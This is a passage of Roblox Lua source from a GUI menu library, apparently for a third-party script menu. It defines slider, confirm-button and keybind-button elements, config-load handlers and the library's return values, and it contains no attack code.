										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end
										Value.Text = val 
										Element.value.Slider = val 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame.AbsolutePosition.X, 0, 175), 0, 5) 
											val = (((tonumber(max) - tonumber(min)) / 175) * Frame.AbsoluteSize.X) + tonumber(min)
										if string.find(tostring(val),'.') then
											valstring = tostring(val)
											valtable = string.split(val,'.')
											if #valtable ~= 0 and typeof(valtable[1]) == 'string' and typeof(valtable[2]) == 'string'  then
											  valstring2 = string.sub(valtable[2],1,2)
											  valstring = valtable[1]..'.'..valstring2
											  val = tonumber(valstring)
											end
											--print(val)
											--print(typeof(val))
										end
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
							elseif type == "Button2" then 
								errorCode = (data.errorCode ~= nil and data.errorCode or 'Error!')
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								local pressedButton = false
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = getMainColor() 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									if TextLabel.Text ~= 'Are you sure?' then
										TextLabel.Text = 'Are you sure?'
										wait(4)
										if not pressedButton then
											TextLabel.Text = text
										end
									elseif TextLabel.Text == 'Are you sure?' then
										pressedButton = true
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
										pressedButton = false
									end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
elseif type == "Button" then 
								errorCode = 'Error!'

								
								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 175, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 
								
								
								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = getMainColor() 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()
											callback()
										end)
											if lmfaooo then
												TextLabel.Text = 'Success!'
												wait(1)
												TextLabel.Text = text
											else 
												TextLabel.Text = errorCode
												wait(1)
												TextLabel.Text = text
												print(lol)
											end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)		
								
								
								
								
								
								
							elseif type == "ButtonKeybind" then 

								Section.Size = Section.Size + C.UDIM2(0,0,0,24) 
								Element.value = {Key = data.default and data.default.Key or nil} 
								local Button = C.INST("Frame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 

								Button.Name = "Button" 
								Button.Parent = Inner 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Position = C.UDIM2(0, 0, 0.236059487, 0) 
								Button.Size = C.UDIM2(1, 0, 0, 24) 

								Button_2.Name = "Button" 
								Button_2.Parent = Button 
								Button_2.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button_2.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button_2.Position = C.UDIM2(0, 30, 0.5, -9) 
								Button_2.Size = C.UDIM2(0, 140, 0, 18) 
								Button_2.AutoButtonColor = false 
								Button_2.Font = Enum.Font.SourceSans 
								Button_2.Text = "" 
								Button_2.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button_2.TextSize = 11.000

								TextLabel.Parent = Button_2 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Size = C.UDIM2(1, 0, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000

								function Element:SetValue() 
								end 

								Button_2.MouseButton1Down:Connect(function() 
									TextLabel.TextColor3 = getMainColor() 
									library:Tween(TextLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										local lmfaooo, lol = pcall(function()callback()end)
									if lmfaooo then
										TextLabel.Text = 'Success!'
										wait(1)
										TextLabel.Text = text
									else 
										TextLabel.Text = 'Error!'
										wait(1)
										TextLabel.Text = text
										print(lol)
									end
								end) 
								Button_2.MouseEnter:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
								end) 
								Button_2.MouseLeave:Connect(function() 
									library:Tween(TextLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
								end)
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'none'
									Keybind.Size = C.UDIM2(0, 43, 0, 12) 
									Keybind.Size = C.UDIM2(0,txt:GetTextSize("NONE", 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 


									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true 
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												keybindremove2(text)
												--Element.value.Active = true 
											end 
											if Element.value.Key ~= nil then
												keybindadd(text,Element.value.Key)
											end
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														--[[if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end--]]
														local lmfaooo, lol = pcall(function()callback()end)
														if lmfaooo then
															keybindpress(text)
															wait(1)
															keybindremove(text)
														else
															error(lol)
														end
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														local lmfaooo, lol = pcall(function()callback()end)
														if lmfaooo then
															keybindpress(text)
															wait(1)
															keybindremove(text)
														else 
															error(lol)
														end
													end 
												end 
											--else 
												--Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									--[[game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end)--]] 
								end
							
							
							end 
							ConfigLoad:Connect(function(cfg) 
								pcall(function() 
									local fix = library:ConfigFix(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)
							ConfigLoad1:Connect(function(cfg) 
								pcall(function() 
									local fix = library:ConfigFix1(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)

							return Element 
						end 
				library.tabs[tabname][sectorname] = Sector
				return Sector 
			end 
			library.tabs[tabname] = Tab
			return Tab 
		end 

		Lunar.Parent = game.CoreGui 
		return menu 
	end
	library['setcfglocation'] = function(cfg)
		cfglocation = cfg
	end
	return library,Signal,ConfigLoad,ConfigLoad1,ConfigUpdateCfgList,ConfigUpdateCfgList2,CreateHitElement